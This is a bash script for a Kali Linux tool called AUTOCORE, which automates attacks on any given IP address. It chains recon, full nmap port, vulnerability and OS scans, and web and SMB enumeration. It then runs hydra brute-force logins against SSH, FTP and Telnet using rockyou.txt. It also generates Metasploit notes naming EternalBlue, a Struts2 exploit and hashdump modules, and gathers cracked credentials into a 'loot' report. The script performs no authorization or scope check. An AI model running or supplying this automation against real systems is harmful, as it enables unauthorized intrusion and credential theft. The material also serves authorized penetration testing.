#!/bin/bash
# ============================================================
#  Tool    : AUTOCORE
#  Author  : Ch Manan (OBLIQ_CORE)
#  Handle  : cynex
#  GitHub  : https://github.com/Abdul-Manan-C
#  Version : 1.0
#  Platform: Kali Linux
# ============================================================

# ─── Colors ───────────────────────────────────────────────
RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; MAGENTA='\033[0;35m'; BLUE='\033[0;34m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
BOLD='\033[1m'

# ─── Banner ───────────────────────────────────────────────
banner() {
echo -e "${RED}"
cat << 'EOF'
  ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████   ▄████▄   ▒█████   ██▀███  ▓█████
 ▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀
 ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒███
 ░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄
  ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▒
  ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░
   ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░   ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░
   ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░        ░ ░ ░ ▒    ░░   ░    ░
       ░  ░   ░                  ░ ░  ░ ░          ░ ░     ░        ░  ░
EOF
echo -e "${RESET}"
echo -e "${CYAN}${BOLD}         [ AUTOCORE v1.0 | Automated Pentest Orchestrator | Kali Linux ]${RESET}"
echo -e "${DIM}         Author: Ch Manan (OBLIQ_CORE) | cynex | github.com/Abdul-Manan-C${RESET}"
echo -e ""
}

# ─── Section Box ──────────────────────────────────────────
section() {
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}║${RESET}  ${WHITE}${BOLD}PHASE $1 — $2${RESET}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${RESET}"
}

# ─── Helpers ──────────────────────────────────────────────
ok()   { echo -e "  ${GREEN}✔${RESET}  $1"; }
err()  { echo -e "  ${RED}✘${RESET}  $1"; }
warn() { echo -e "  ${YELLOW}!${RESET}  $1"; }
run()  { echo -e "  ${MAGENTA}>>${RESET} $1"; }
save() { echo -e "  ${BLUE}💾${RESET} Saved: $1"; }

check_tool() { command -v "$1" &>/dev/null; }

run_tool() {
    local name="$1"; shift
    if check_tool "$name"; then
        run "$name $*"
        "$name" "$@" 2>/dev/null
    else
        warn "$name not found — skipping"
    fi
}

# ─── Usage ────────────────────────────────────────────────
usage() {
    echo -e "${WHITE}Usage:${RESET}"
    echo -e "  autocore <IP>           — Full auto scan"
    echo -e "  autocore <IP> --web     — Web phase only"
    echo -e "  autocore <IP> --smb     — SMB phase only"
    echo -e "  autocore <IP> --brute   — Brute force phase only"
    echo -e "  autocore <IP> --full    — All phases (verbose)"
    echo -e "  autocore <IP> --stealth — Stealth mode (slow scans)"
    exit 0
}

# ─── Args ─────────────────────────────────────────────────
[[ $# -lt 1 ]] && banner && usage
TARGET="$1"
MODE="${2:---full}"
if [[ "$TARGET" == -* ]]; then
    banner
    usage
fi

banner

# ─── Session Setup ────────────────────────────────────────
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SESSION="autocore_${TARGET}_${TIMESTAMP}"
mkdir -p "$SESSION"/{nmap,web,nikto,smb,hydra,metasploit,whatweb,enum,loot}
ok "Session directory: $SESSION"
echo -e "  ${DIM}Mode: $MODE | Target: $TARGET${RESET}\n"

WORDLIST_DIR="/usr/share/wordlists"
WORDLIST_DIRS="$WORDLIST_DIR/dirb/common.txt"
WORDLIST_FILES="$WORDLIST_DIR/dirb/extensions_common.txt"
WORDLIST_PASS="$WORDLIST_DIR/rockyou.txt"
WORDLIST_USER="/usr/share/wordlists/metasploit/unix_users.txt"

OPEN_PORTS=""
HAS_WEB=false; HAS_SMB=false; HAS_SSH=false; HAS_FTP=false; HAS_TELNET=false

# ─── Phase 1: Recon ───────────────────────────────────────
phase_recon() {
    section 1 "RECON — WHOIS / DNS / PING"
    RECON_FILE="$SESSION/enum/recon.txt"
    {
        echo "=== PING ===" && ping -c 3 "$TARGET" 2>/dev/null
        echo -e "\n=== WHOIS ===" && run_tool whois "$TARGET"
        echo -e "\n=== HOST ===" && run_tool host "$TARGET"
        echo -e "\n=== NSLOOKUP ===" && run_tool nslookup "$TARGET"
    } | tee "$RECON_FILE"
    save "$RECON_FILE"
}

# ─── Phase 2: Nmap ────────────────────────────────────────
phase_nmap() {
    section 2 "NMAP — PORT & SERVICE SCAN"

    # Quick scan
    run "nmap -sS -T4 --top-ports 1000 $TARGET"
    sudo nmap -sS -T4 --top-ports 1000 "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null
    save "$SESSION/nmap/nmap_1_quick.txt"

    # Full port scan
    run "nmap -sS -T4 -p- $TARGET"
    sudo nmap -sS -T4 -p- "$TARGET" -oN "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null
    save "$SESSION/nmap/nmap_2_fullports.txt"

    # Extract open ports
    OPEN_PORTS=$(grep "^[0-9]" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
    ok "Open ports: $OPEN_PORTS"

    # Service detection
    if [[ -n "$OPEN_PORTS" ]]; then
        run "nmap -sS -sV -sC -p${OPEN_PORTS} $TARGET"
        sudo nmap -sS -sV -sC -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_3_services.txt" 2>/dev/null
        save "$SESSION/nmap/nmap_3_services.txt"

        # Vuln scripts
        run "nmap --script vuln -p${OPEN_PORTS} $TARGET"
        sudo nmap --script vuln -p"${OPEN_PORTS}" "$TARGET" -oN "$SESSION/nmap/nmap_4_vulns.txt" 2>/dev/null
        save "$SESSION/nmap/nmap_4_vulns.txt"

        # OS detection
        run "nmap -O $TARGET"
        sudo nmap -O "$TARGET" -oN "$SESSION/nmap/nmap_5_os.txt" 2>/dev/null
        save "$SESSION/nmap/nmap_5_os.txt"
    fi

    # Detect services
    grep -q "80/open\|443/open\|8080/open\|8443/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_WEB=true
    grep -q "445/open\|139/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_SMB=true
    grep -q "22/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_SSH=true
    grep -q "21/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_FTP=true
    grep -q "23/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && HAS_TELNET=true

    [[ "$HAS_WEB" == true ]] && ok "Web service detected"
    [[ "$HAS_SMB" == true ]] && ok "SMB service detected"
    [[ "$HAS_SSH" == true ]] && ok "SSH service detected"
    [[ "$HAS_FTP" == true ]] && ok "FTP service detected"
    [[ "$HAS_TELNET" == true ]] && ok "Telnet service detected"
}

# ─── Phase 3: Web ─────────────────────────────────────────
phase_web() {
    section 3 "WEB — ENUM / DIRECTORY / HEADERS"
    [[ "$HAS_WEB" != true ]] && warn "No web service detected — skipping" && return

    WEBPORT="80"
    grep -q "443/open" "$SESSION/nmap/nmap_2_fullports.txt" 2>/dev/null && WEBPORT="443"
    PROTO="http"; [[ "$WEBPORT" == "443" ]] && PROTO="https"
    URL="${PROTO}://${TARGET}"

    # WhatWeb
    run_tool whatweb "$URL" | tee "$SESSION/whatweb/whatweb_1.txt"
    save "$SESSION/whatweb/whatweb_1.txt"

    # Nikto
    run_tool nikto -h "$URL" -o "$SESSION/nikto/nikto_1.txt" 2>/dev/null
    save "$SESSION/nikto/nikto_1.txt"

    # Gobuster dirs
    if check_tool gobuster && [[ -f "$WORDLIST_DIRS" ]]; then
        run "gobuster dir -u $URL -w $WORDLIST_DIRS"
        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -o "$SESSION/web/gobuster_1_dirs.txt" 2>/dev/null
        save "$SESSION/web/gobuster_1_dirs.txt"
    else
        warn "gobuster or wordlist missing — skipping dir enum"
    fi

    # Gobuster files
    if check_tool gobuster && [[ -f "$WORDLIST_DIRS" ]]; then
        run "gobuster dir -u $URL -w $WORDLIST_DIRS -x php,txt,html,js,bak"
        gobuster dir -u "$URL" -w "$WORDLIST_DIRS" -x php,txt,html,js,bak -o "$SESSION/web/gobuster_2_files.txt" 2>/dev/null
        save "$SESSION/web/gobuster_2_files.txt"
    fi

    # Headers
    run "curl -I $URL"
    curl -skI "$URL" 2>/dev/null | tee "$SESSION/web/headers_1.txt"
    save "$SESSION/web/headers_1.txt"

    # robots.txt
    run "curl ${URL}/robots.txt"
    curl -sk "${URL}/robots.txt" 2>/dev/null | tee "$SESSION/web/robots_1.txt"
    save "$SESSION/web/robots_1.txt"

    # sitemap.xml
    run "curl ${URL}/sitemap.xml"
    curl -sk "${URL}/sitemap.xml" 2>/dev/null | tee "$SESSION/web/sitemap_1.txt"
    save "$SESSION/web/sitemap_1.txt"
}

# ─── Phase 4: SMB ─────────────────────────────────────────
phase_smb() {
    section 4 "SMB — ENUMERATION"
    [[ "$HAS_SMB" != true ]] && warn "No SMB service detected — skipping" && return

    run_tool enum4linux -a "$TARGET" | tee "$SESSION/smb/enum4linux_1_full.txt"
    save "$SESSION/smb/enum4linux_1_full.txt"

    if check_tool smbclient; then
        run "smbclient -L $TARGET"
        smbclient -L "//${TARGET}" -N 2>/dev/null | tee "$SESSION/smb/smb_1_shares.txt"
        save "$SESSION/smb/smb_1_shares.txt"
    fi

    run "nmap smb scripts"
    sudo nmap -p 445,139 --script smb-vuln*,smb-enum* "$TARGET" -oN "$SESSION/smb/nmap_smb_scripts.txt" 2>/dev/null
    save "$SESSION/smb/nmap_smb_scripts.txt"
}

# ─── Phase 5: Brute Force ─────────────────────────────────
phase_brute() {
    section 5 "BRUTE FORCE — HYDRA"
    [[ -f "$WORDLIST_PASS" ]] || { warn "rockyou.txt not found — skipping brute"; return; }

    if [[ "$HAS_SSH" == true ]] && check_tool hydra; then
        run "hydra SSH $TARGET"
        hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ssh -o "$SESSION/hydra/hydra_1_ssh.txt" 2>/dev/null
        save "$SESSION/hydra/hydra_1_ssh.txt"
    fi

    if [[ "$HAS_FTP" == true ]] && check_tool hydra; then
        run "hydra FTP $TARGET"
        hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" ftp -o "$SESSION/hydra/hydra_2_ftp.txt" 2>/dev/null
        save "$SESSION/hydra/hydra_2_ftp.txt"
    fi

    if [[ "$HAS_TELNET" == true ]] && check_tool hydra; then
        run "hydra Telnet $TARGET"
        hydra -L "$WORDLIST_USER" -P "$WORDLIST_PASS" "$TARGET" telnet -o "$SESSION/hydra/hydra_3_telnet.txt" 2>/dev/null
        save "$SESSION/hydra/hydra_3_telnet.txt"
    fi

    if [[ "$HAS_WEB" == true ]]; then
        cat > "$SESSION/hydra/hydra_4_http_template.txt" << EOF
# HTTP Brute Force Template — Edit before running
# hydra -L users.txt -P rockyou.txt $TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
# hydra -L users.txt -P rockyou.txt $TARGET http-get /admin
EOF
        save "$SESSION/hydra/hydra_4_http_template.txt"
    fi
}

# ─── Phase 6: Metasploit Notes ────────────────────────────
phase_msf() {
    section 6 "METASPLOIT — NOTES & COMMANDS"
    MSF_FILE="$SESSION/metasploit/metasploit_notes.txt"
    cat > "$MSF_FILE" << EOF
# ============================================================
# AUTOCORE — Metasploit Notes for $TARGET
# Generated: $(date)
# ============================================================

## Start Metasploit
msfconsole

## Search for exploits based on detected services
search type:exploit platform:linux
search eternalblue
search ms17-010

## SMB Exploits (if SMB detected)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set LHOST <your_ip>
run

## Web Exploits
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS $TARGET
run

## Post Exploitation
use post/multi/recon/local_exploit_suggester
use post/linux/gather/hashdump

## Useful auxiliary modules
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_header
EOF
    save "$MSF_FILE"
    ok "Metasploit notes generated"
}

# ─── Phase 7: Loot Report ─────────────────────────────────
phase_report() {
    section 7 "FINAL REPORT — LOOT SUMMARY"
    REPORT_FILE="$SESSION/REPORT_${TARGET}.txt"
    LOOT_FILE="$SESSION/loot/loot_summary.txt"

    CREDS_FOUND=$(grep -r "login:" "$SESSION/hydra/" 2>/dev/null | grep -v "template" | head -20)
    VULNS_FOUND=$(grep -i "VULNERABLE\|CVE" "$SESSION/nmap/nmap_4_vulns.txt" 2>/dev/null | head -20)

    {
        echo "╔══════════════════════════════════════════════════════╗"
        echo "║         AUTOCORE PENTEST REPORT                      ║"
        echo "╠══════════════════════════════════════════════════════╣"
        echo "║  Target   : $TARGET"
        echo "║  Session  : $SESSION"
        echo "║  Date     : $(date)"
        echo "╚══════════════════════════════════════════════════════╝"
        echo ""
        echo "=== OPEN PORTS ==="
        echo "$OPEN_PORTS" | tr ',' '\n' | grep -v '^$' | sed 's/^/  - /'
        echo ""
        echo "=== SERVICES ==="
        [[ "$HAS_WEB" == true ]] && echo "  - Web (HTTP/HTTPS)"
        [[ "$HAS_SMB" == true ]] && echo "  - SMB (Samba)"
        [[ "$HAS_SSH" == true ]] && echo "  - SSH"
        [[ "$HAS_FTP" == true ]] && echo "  - FTP"
        [[ "$HAS_TELNET" == true ]] && echo "  - Telnet"
        echo ""
        echo "=== CREDENTIALS FOUND ==="
        [[ -n "$CREDS_FOUND" ]] && echo "$CREDS_FOUND" || echo "  None found"
        echo ""
        echo "=== VULNERABILITIES ==="
        [[ -n "$VULNS_FOUND" ]] && echo "$VULNS_FOUND" || echo "  None detected by vuln scripts"
        echo ""
        echo "=== OUTPUT FILES ==="
        find "$SESSION" -type f | sort | sed 's/^/  /'
    } | tee "$REPORT_FILE" "$LOOT_FILE"

    save "$REPORT_FILE"
    save "$LOOT_FILE"

    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${GREEN}║${RESET}  ${GREEN}✔${RESET}  ${WHITE}${BOLD}AUTOCORE COMPLETE${RESET}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Session : $SESSION${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Report  : $REPORT_FILE${RESET}"
    echo -e "${GREEN}║${RESET}  ${DIM}Loot    : $LOOT_FILE${RESET}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
}

# ─── Run Phases ───────────────────────────────────────────
case "$MODE" in
    --web)
        phase_recon; phase_nmap; phase_web ;;
    --smb)
        phase_recon; phase_nmap; phase_smb ;;
    --brute)
        phase_recon; phase_nmap; phase_brute ;;
    --stealth)
        phase_recon
        OPEN_PORTS=$(sudo nmap -sS -T2 -p- "$TARGET" -oN "$SESSION/nmap/nmap_1_quick.txt" 2>/dev/null | grep "open" | awk -F/ '{print $1}' | tr '\n' ',')
        phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
    *)
        phase_recon; phase_nmap; phase_web; phase_smb; phase_brute; phase_msf; phase_report ;;
esac
